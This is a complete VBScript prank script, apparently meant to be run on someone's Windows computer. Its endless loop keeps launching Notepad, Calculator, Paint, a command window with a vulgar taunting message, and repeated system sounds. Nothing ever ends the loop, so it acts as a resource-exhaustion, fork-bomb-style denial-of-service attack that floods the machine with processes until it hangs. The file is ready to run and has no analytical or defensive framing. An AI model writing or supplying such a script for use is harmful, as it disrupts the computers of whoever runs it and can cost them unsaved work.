Do
    Set objShell = CreateObject("WScript.Shell")

    ' Open multiple instances of different applications
    objShell.Run "notepad.exe"
    objShell.Run "calc.exe"
    objShell.Run "mspaint.exe"
    objShell.Run "cmd.exe /k echo Your computer is now shitting itself!"

    ' Play a sound loop
    objShell.Run "mplayer2.exe C:\Windows\Media\chime.wav" ' Change this to any sound file path you have
    objShell.Run "mplayer2.exe C:\Windows\Media\chord.wav" ' Change this to any sound file path you have
    objShell.Run "mplayer2.exe C:\Windows\Media\tada.wav" ' Change this to any sound file path you have
Loop
